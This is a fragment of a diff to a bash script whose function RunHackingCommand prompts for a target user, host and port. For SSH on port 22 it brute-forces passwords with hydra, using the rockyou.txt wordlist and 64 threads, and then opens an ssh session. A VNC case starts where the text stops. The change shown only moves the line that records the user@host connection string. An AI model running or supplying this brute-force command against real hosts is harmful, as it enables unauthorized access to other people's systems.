@@ -96,13 +96,12 @@ RunHackingCommand() {
     read -p "Input Username: " user
     read -p "Input Hostname: " host
     read -p "Input Port: " port
+    echo "${user}@${host}" > "${ssh_connection}"
 
 
     case "$port" in
     22)
         hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host":"$port"
-        echo "${user}@${host}" > "${ssh_connection}"
-
         ssh "${user}@${host}" -p "${port}"
         ;;
     5900)
